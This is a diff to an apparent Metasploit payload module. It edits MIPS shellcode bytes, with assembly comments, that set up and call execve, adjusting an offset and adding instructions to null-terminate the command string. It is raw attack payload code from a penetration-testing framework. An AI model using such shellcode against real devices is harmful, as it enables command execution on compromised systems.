@@ -109,11 +109,16 @@ module Metasploit3
 		"\xff\xff\xd0\x04" + # LB: bltzal  a2,LB
 		"\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
 		"\xff\xff\x06\x28" + #     slti    a2,zero,-1
-		"\xdb\xff\x0f\x24" + #     li      t7,-37
+		"\xc7\xff\x0f\x24" + #     li      t7,-57
 		"\x27\x78\xe0\x01" + #     nor     t7,t7,zero
 		"\x21\x20\xef\x03" + #     addu    a0,ra,t7
 		"\xf0\xff\xa4\xaf" + #     sw      a0,-16(sp)
 		"\xf4\xff\xa0\xaf" + #     sw      zero,-12(sp)
+		"\xf7\xff\x0e\x24" + #     li      t6,-9
+		"\x27\x70\xc0\x01" + #     nor     t6,t6,zero
+		"\x21\x60\xef\x03" + #     addu    t4,ra,t7
+		"\x21\x68\x8e\x01" + #     addu    t5,t4,t6
+		"\xff\xff\xa0\xad" + #     sw      zero,-1(t5)
 		"\xf0\xff\xa5\x23" + #     addi    a1,sp,-16
 		"\xab\x0f\x02\x24" + #     li      v0,4011 ( __NR_execve )
 		"\x0c\x01\x01\x01" + #     syscall
